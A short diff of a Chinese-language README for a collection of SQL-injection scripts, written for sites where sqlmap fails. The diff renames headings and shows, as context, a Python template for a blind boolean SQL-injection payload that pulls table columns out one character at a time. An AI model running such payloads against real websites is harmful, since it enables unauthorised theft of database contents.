@@ -1,5 +1,3 @@
-# SQL-injection
-
 # 1.写这些脚本的目的
 
 解决sqlmap不能跑的站点，并且手工注入又会消耗大量的时间和精力的情况。
@@ -52,6 +50,7 @@ e.g.三个列
 payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" \
 % (self.column[0],self.column[1],self.column[2],self.table, self.i, x, n)
 ```
+# 3.目录
 
 ```html
 ###########
